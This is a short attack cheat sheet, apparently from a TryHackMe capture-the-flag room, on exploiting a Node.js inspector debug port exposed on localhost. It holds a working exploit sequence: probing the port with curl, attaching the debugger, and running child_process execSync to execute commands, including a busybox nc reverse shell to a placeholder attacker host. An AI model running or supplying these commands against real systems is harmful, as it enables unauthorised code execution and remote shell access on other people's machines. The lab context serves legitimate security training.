# Node Inspector Debug Port

A `node --inspect=127.0.0.1:<port>` process is a lateral-movement path for any local user who can reach the port — the debugger can execute arbitrary code as that process's owner.

```bash
curl http://127.0.0.1:9229/json          # confirm it's listening
node inspect 127.0.0.1:9229              # attach

# in the debugger:
exec (process.mainModule.require('child_process').execSync('id').toString())
exec (process.mainModule.require('child_process').execSync('busybox nc <LHOST> <LPORT> -e bash').toString())
```

— TryHackMe / Do Not Disturb
